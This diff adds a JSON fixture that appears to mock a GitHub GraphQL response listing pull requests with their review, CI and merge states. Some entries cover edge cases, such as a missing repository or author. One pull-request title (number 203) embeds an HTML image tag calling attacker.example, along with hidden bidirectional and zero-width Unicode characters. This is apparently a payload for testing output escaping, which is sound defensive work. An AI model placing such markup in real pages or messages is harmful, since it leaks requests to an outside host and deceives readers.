@@ -1,0 +1,490 @@
+{
+ "data": {
+  "rateLimit": {
+   "cost": 1,
+   "remaining": 4973
+  },
+  "reviewRequested": {
+   "issueCount": 88,
+   "pageInfo": {
+    "hasNextPage": true
+   },
+   "nodes": [
+    {
+     "number": 201,
+     "title": "Rework the auth middleware",
+     "isDraft": false,
+     "createdAt": "2026-08-01T00:00:00Z",
+     "updatedAt": "2026-08-21T11:00:00Z",
+     "author": {
+      "login": "jmartin",
+      "__typename": "User"
+     },
+     "repository": {
+      "nameWithOwner": "acme/gateway",
+      "isPrivate": false,
+      "isArchived": false
+     },
+     "isCrossRepository": false,
+     "reviewDecision": "REVIEW_REQUIRED",
+     "mergeable": "MERGEABLE",
+     "commits": {
+      "nodes": [
+       {
+        "commit": {
+         "statusCheckRollup": {
+          "state": "SUCCESS"
+         }
+        }
+       }
+      ]
+     },
+     "latestOpinionatedReviews": {
+      "nodes": []
+     }
+    },
+    {
+     "number": 202,
+     "title": "Bump left-pad from 1.0.0 to 1.0.1",
+     "isDraft": false,
+     "createdAt": "2026-08-01T00:00:00Z",
+     "updatedAt": "2026-08-19T09:00:00Z",
+     "author": {
+      "login": "depbot",
+      "__typename": "Bot"
+     },
+     "repository": {
+      "nameWithOwner": "acme/gateway",
+      "isPrivate": false,
+      "isArchived": false
+     },
+     "isCrossRepository": false,
+     "reviewDecision": null,
+     "mergeable": "MERGEABLE",
+     "commits": {
+      "nodes": [
+       {
+        "commit": {
+         "statusCheckRollup": {
+          "state": "FAILURE"
+         }
+        }
+       }
+      ]
+     },
+     "latestOpinionatedReviews": {
+      "nodes": []
+     }
+    },
+    {
+     "number": 203,
+     "title": "<img src=\"http://attacker.example/?u=me\">rev‮null​󠁁",
+     "isDraft": false,
+     "createdAt": "2026-08-01T00:00:00Z",
+     "updatedAt": "2026-08-10T00:00:00Z",
+     "author": {
+      "login": "kosei",
+      "__typename": "User"
+     },
+     "repository": {
+      "nameWithOwner": "acme/gateway",
+      "isPrivate": false,
+      "isArchived": false
+     },
+     "isCrossRepository": false,
+     "reviewDecision": "REVIEW_REQUIRED",
+     "mergeable": "MERGEABLE",
+     "commits": {
+      "nodes": [
+       {
+        "commit": {
+         "statusCheckRollup": null
+        }
+       }
+      ]
+     },
+     "latestOpinionatedReviews": {
+      "nodes": []
+     }
+    },
+    {
+     "number": 204,
+     "title": "Add the missing index",
+     "isDraft": false,
+     "createdAt": "2026-08-01T00:00:00Z",
+     "updatedAt": "2026-08-21T13:00:00Z",
+     "author": {
+      "login": "adeyemi",
+      "__typename": "User"
+     },
+     "repository": {
+      "nameWithOwner": "northwind/ledger",
+      "isPrivate": true,
+      "isArchived": false
+     },
+     "isCrossRepository": true,
+     "reviewDecision": "REVIEW_REQUIRED",
+     "mergeable": "UNKNOWN",
+     "commits": {
+      "nodes": [
+       {
+        "commit": {
+         "statusCheckRollup": {
+          "state": "SUCCESS"
+         }
+        }
+       }
+      ]
+     },
+     "latestOpinionatedReviews": {
+      "nodes": []
+     }
+    },
+    {
+     "number": 205,
+     "title": "WIP spike",
+     "isDraft": true,
+     "createdAt": "2026-08-01T00:00:00Z",
+     "updatedAt": "2026-08-21T12:00:00Z",
+     "author": {
+      "login": "tvarga",
+      "__typename": "User"
+     },
+     "repository": {
+      "nameWithOwner": "acme/gateway",
+      "isPrivate": false,
+      "isArchived": false
+     },
+     "isCrossRepository": false,
+     "reviewDecision": "REVIEW_REQUIRED",
+     "mergeable": "MERGEABLE",
+     "commits": {
+      "nodes": [
+       {
+        "commit": {
+         "statusCheckRollup": {
+          "state": "SUCCESS"
+         }
+        }
+       }
+      ]
+     },
+     "latestOpinionatedReviews": {
+      "nodes": []
+     }
+    },
+    {
+     "number": 206,
+     "title": "no repository"
+    },
+    {
+     "number": 207,
+     "title": "no author",
+     "isDraft": false,
+     "createdAt": "2026-08-01T00:00:00Z",
+     "updatedAt": "2026-08-21T12:00:00Z",
+     "author": null,
+     "repository": {
+      "nameWithOwner": "acme/gateway",
+      "isPrivate": false,
+      "isArchived": false
+     },
+     "isCrossRepository": false,
+     "reviewDecision": "REVIEW_REQUIRED",
+     "mergeable": "MERGEABLE",
+     "commits": {
+      "nodes": [
+       {
+        "commit": {
+         "statusCheckRollup": {
+          "state": "SUCCESS"
+         }
+        }
+       }
+      ]
+     },
+     "latestOpinionatedReviews": {
+      "nodes": []
+     }
+    }
+   ]
+  },
+  "mine": {
+   "issueCount": 112,
+   "pageInfo": {
+    "hasNextPage": true
+   },
+   "nodes": [
+    {
+     "number": 301,
+     "title": "Split the migration into two steps",
+     "isDraft": false,
+     "createdAt": "2026-08-01T00:00:00Z",
+     "updatedAt": "2026-08-18T08:00:00Z",
+     "author": {
+      "login": "rlee",
+      "__typename": "User"
+     },
+     "repository": {
+      "nameWithOwner": "acme/gateway",
+      "isPrivate": false,
+      "isArchived": false
+     },
+     "isCrossRepository": false,
+     "reviewDecision": "CHANGES_REQUESTED",
+     "mergeable": "MERGEABLE",
+     "commits": {
+      "nodes": [
+       {
+        "commit": {
+         "statusCheckRollup": {
+          "state": "SUCCESS"
+         }
+        }
+       }
+      ]
+     },
+     "latestOpinionatedReviews": {
+      "nodes": []
+     }
+    },
+    {
+     "number": 302,
+     "title": "Cache the schema lookup",
+     "isDraft": false,
+     "createdAt": "2026-08-01T00:00:00Z",
+     "updatedAt": "2026-08-05T08:00:00Z",
+     "author": {
+      "login": "rlee",
+      "__typename": "User"
+     },
+     "repository": {
+      "nameWithOwner": "acme/gateway",
+      "isPrivate": false,
+      "isArchived": false
+     },
+     "isCrossRepository": false,
+     "reviewDecision": null,
+     "mergeable": "MERGEABLE",
+     "commits": {
+      "nodes": [
+       {
+        "commit": {
+         "statusCheckRollup": {
+          "state": "SUCCESS"
+         }
+        }
+       }
+      ]
+     },
+     "latestOpinionatedReviews": {
+      "nodes": [
+       {
+        "state": "APPROVED"
+       },
+       {
+        "state": "CHANGES_REQUESTED"
+       }
+      ]
+     }
+    },
+    {
+     "number": 303,
+     "title": "Document the rollback procedure",
+     "isDraft": false,
+     "createdAt": "2026-08-01T00:00:00Z",
+     "updatedAt": "2026-08-20T08:00:00Z",
+     "author": {
+      "login": "rlee",
+      "__typename": "User"
+     },
+     "repository": {
+      "nameWithOwner": "acme/gateway",
+      "isPrivate": false,
+      "isArchived": false
+     },
+     "isCrossRepository": false,
+     "reviewDecision": null,
+     "mergeable": "CONFLICTING",
+     "commits": {
+      "nodes": [
+       {
+        "commit": {
+         "statusCheckRollup": {
+          "state": "SUCCESS"
+         }
+        }
+       }
+      ]
+     },
+     "latestOpinionatedReviews": {
+      "nodes": []
+     }
+    },
+    {
+     "number": 304,
+     "title": "Reject empty payloads at the boundary",
+     "isDraft": false,
+     "createdAt": "2026-08-01T00:00:00Z",
+     "updatedAt": "2026-08-21T10:00:00Z",
+     "author": {
+      "login": "rlee",
+      "__typename": "User"
+     },
+     "repository": {
+      "nameWithOwner": "acme/gateway",
+      "isPrivate": false,
+      "isArchived": false
+     },
+     "isCrossRepository": false,
+     "reviewDecision": "APPROVED",
+     "mergeable": "MERGEABLE",
+     "commits": {
+      "nodes": [
+       {
+        "commit": {
+         "statusCheckRollup": {
+          "state": "SUCCESS"
+         }
+        }
+       }
+      ]
+     },
+     "latestOpinionatedReviews": {
+      "nodes": []
+     }
+    },
+    {
+     "number": 305,
+     "title": "Tidy the changelog",
+     "isDraft": false,
+     "createdAt": "2026-08-01T00:00:00Z",
+     "updatedAt": "2026-08-21T12:00:00Z",
+     "author": {
+      "login": "rlee",
+      "__typename": "User"
+     },
+     "repository": {
+      "nameWithOwner": "acme/gateway",
+      "isPrivate": false,
+      "isArchived": false
+     },
+     "isCrossRepository": false,
+     "reviewDecision": "APPROVED",
+     "mergeable": "MERGEABLE",
+     "commits": {
+      "nodes": [
+       {
+        "commit": {
+         "statusCheckRollup": null
+        }
+       }
+      ]
+     },
+     "latestOpinionatedReviews": {
+      "nodes": []
+     }
+    },
+    {
+     "number": 306,
+     "title": "Widen the integration timeout",
+     "isDraft": false,
+     "createdAt": "2026-08-01T00:00:00Z",
+     "updatedAt": "2026-08-21T12:00:00Z",
+     "author": {
+      "login": "rlee",
+      "__typename": "User"
+     },
+     "repository": {
+      "nameWithOwner": "acme/gateway",
+      "isPrivate": false,
+      "isArchived": false
+     },
+     "isCrossRepository": false,
+     "reviewDecision": "APPROVED",
+     "mergeable": "UNKNOWN",
+     "commits": {
+      "nodes": [
+       {
+        "commit": {
+         "statusCheckRollup": {
+          "state": "SUCCESS"
+         }
+        }
+       }
+      ]
+     },
+     "latestOpinionatedReviews": {
+      "nodes": []
+     }
+    },
+    {
+     "number": 307,
+     "title": "Add retry backoff",
+     "isDraft": false,
+     "createdAt": "2026-08-01T00:00:00Z",
+     "updatedAt": "2026-08-21T12:00:00Z",
+     "author": {
+      "login": "rlee",
+      "__typename": "User"
+     },
+     "repository": {
+      "nameWithOwner": "acme/gateway",
+      "isPrivate": false,
+      "isArchived": false
+     },
+     "isCrossRepository": false,
+     "reviewDecision": "REVIEW_REQUIRED",
+     "mergeable": "MERGEABLE",
+     "commits": {
+      "nodes": [
+       {
+        "commit": {
+         "statusCheckRollup": {
+          "state": "SUCCESS"
+         }
+        }
+       }
+      ]
+     },
+     "latestOpinionatedReviews": {
+      "nodes": []
+     }
+    },
+    {
+     "number": 308,
+     "title": "Draft of the ingest rewrite",
+     "isDraft": true,
+     "createdAt": "2026-08-01T00:00:00Z",
+     "updatedAt": "2026-08-21T12:00:00Z",
+     "author": {
+      "login": "rlee",
+      "__typename": "User"
+     },
+     "repository": {
+      "nameWithOwner": "acme/gateway",
+      "isPrivate": false,
+      "isArchived": false
+     },
+     "isCrossRepository": false,
+     "reviewDecision": null,
+     "mergeable": "MERGEABLE",
+     "commits": {
+      "nodes": [
+       {
+        "commit": {
+         "statusCheckRollup": {
+          "state": "SUCCESS"
+         }
+        }
+       }
+      ]
+     },
+     "latestOpinionatedReviews": {
+      "nodes": []
+     }
+    }
+   ]
+  }
+ }
+}
